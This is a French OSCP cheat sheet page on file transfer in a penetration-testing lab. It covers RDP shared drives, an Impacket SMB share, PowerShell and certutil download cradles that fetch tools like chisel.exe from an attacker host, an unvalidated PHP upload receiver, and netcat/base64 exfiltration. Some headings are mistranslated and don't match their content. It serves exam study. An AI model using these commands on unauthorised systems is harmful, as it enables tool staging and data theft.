---
title: "OSCP · Transfert de fichiers"
description: "Envoyer, récupérer et encoder des fichiers dans un laboratoire."
---

# OSCP · Transfert de fichiers

Envoyer, récupérer et encoder des fichiers dans un laboratoire.


## Dossier partagé RDP


<p class="oscp-command-note">Ouvrir une session RDP.</p>

```bash
xfreerdp /compression +auto-reconnect /u:[user] /p:'[password]' /v:[IP] +clipboard /size:1920x1080 /drive:desktop,/home/[your_username]/Desktop
```




```bash
rdesktop -z -P -x m -u [user] -p [password] [IP] -r disk:test=/home/[your_username]/Desktop
```


**Paramètres et repères :**
`lget` · `lput`  




```text
download [file_name] [optional_file_destination_path]
```




```text
upload [file_name] [optional_file_destination_path]
```


## FTP

Transférer ou récupérer des fichiers dans le laboratoire.


**Paramètres et repères :**
`binary`  


## SMB

Examiner les objets, les droits et les services du domaine.


<p class="oscp-command-note">Commande Impacket dans la rubrique « SMB ».</p>

```bash
impacket-smbserver [name_we_give_to_this_share] . -smb2support  -username my_user -password my_password
```


<p class="oscp-command-note">Examiner les comptes ou ressources Windows.</p>

```bash
net use m: \\[my_kali_IP]\[name_we_gave_to_the_share] /user:my_user my_password
```


## Requêtes HTTP

Examiner les entrées et les réponses de l'application web.


<p class="oscp-command-note">Exécuter un script Python.</p>

```powershell
python3 -m http.server 80

(new-object System.Net.WebClient).DownloadFile('http://192.168.119.138:800/chisel.exe','C:\Windows\Tasks\chisel.exe')
```


<p class="oscp-command-note">Script shell dans la rubrique « Requêtes HTTP ».</p>

```bash
# Depuis PowerShell
(New-Object System.Net.WebClient).DownloadFile('http://[kali_IP]/[file_to_download]', '[output_file_name_or_path]')

Invoke-WebRequest -Uri http://[kali_IP]/[file_to_download] -OutFile [output_file_name]

# Si iwr ne fonctionne pas
certutil -urlcache -split -f http://[kali_IP]/[file_to_download]

# Depuis CMD
powershell -Command "(New-Object Net.WebClient).DownloadFile('http://[kali_IP]/[file_to_download]', '[output_file_name_or_path]')"
```


## PHP Script (apporter des fichiers depuis Windows)

Examiner les entrées et les réponses de l'application web.


**Paramètres et repères :**
`upload.php`  


<p class="oscp-command-note">Extrait PHP lié à « PHP Script (bring files from Windows) ».</p>

```php
<?php
  $uploaddir = '/var/www/uploads/';

  $uploadfile = $uploaddir . $_FILES['file']['name'];

  move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
?>
```


**Paramètres et repères :**
`var/www/uploads`  


<p class="oscp-command-note">Modifier les permissions d&#x27;un fichier.</p>

```bash
chmod +x upload.php

sudo mkdir /var/www/uploads

mv upload.php /var/www/uploads
```




```bash
service apache2 start

ps -ef | grep apache
```


<p class="oscp-command-note">Exécuter un script PowerShell.</p>

```powershell
powershell (New-Object System.Net.WebClient).UploadFile('http://<your Kali ip>/upload.php', '<file you want to transfer>')
```




```bash
service apache2 stop
```


## Montant net

Vérifier les ports et les services de la cible autorisée.


### Envoyer un fichier


<p class="oscp-command-note">Ouvrir un port d&#x27;écoute Netcat.</p>

```bash
nc -lvp 4444 > received_file.txt

# (facultatif) Si nous avons besoin de transférer les fichiers sur une connexion chiffrée, il suffit de joindre l'option --ssl
ncat --ssl -lvp 4444 > received_file.txt
```


<p class="oscp-command-note">Établir ou tester une connexion avec Netcat.</p>

```bash
nc <receiver_IP> 4444 < file_to_send.txt

# (facultatif) Si nous avons besoin de recevoir les fichiers sur une connexion chiffrée, il suffit de joindre l'option --ssl
ncat --ssl <receiver_IP> 4444 < file_to_send.txt
```


### Envoyer un fichier avec compression


<p class="oscp-command-note">Ouvrir un port d&#x27;écoute Netcat.</p>

```bash
nc -lvp 4444 | tar xzvf -
```




```bash
tar czvf - file_or_folder_to_send | nc <receiver_IP> 4444
```


### Transferring Base64 via Copy and Paste

Transférer ou récupérer des fichiers dans le laboratoire.




```bash
# Ceci va imprimer la chaîne Base64 directement dans le terminal, que vous pouvez copier manuellement
base64 file_to_send.txt
```


<p class="oscp-command-note">Afficher ou écrire une valeur.</p>

```bash
# Vous pouvez coller manuellement le contenu encodé Base64 dans un nouveau fichier
echo "PASTE_BASE64_CONTENTS_HERE" | base64 -d > received_file.txt
```


### Transferring Base64 Contents via Netcat

Vérifier les ports et les services de la cible autorisée.


<p class="oscp-command-note">Ouvrir un port d&#x27;écoute Netcat.</p>

```bash
nc -lvp 4444 | base64 -d > received_file.txt
```




```bash
base64 file_to_send.txt | nc <receiver_IP> 4444
```

---

Source documentaire : [OSCP+ Cheatsheet d'Emmanuel Solis](https://www.emmanuelsolis.com/oscp.html).

<!-- refined-oscp -->
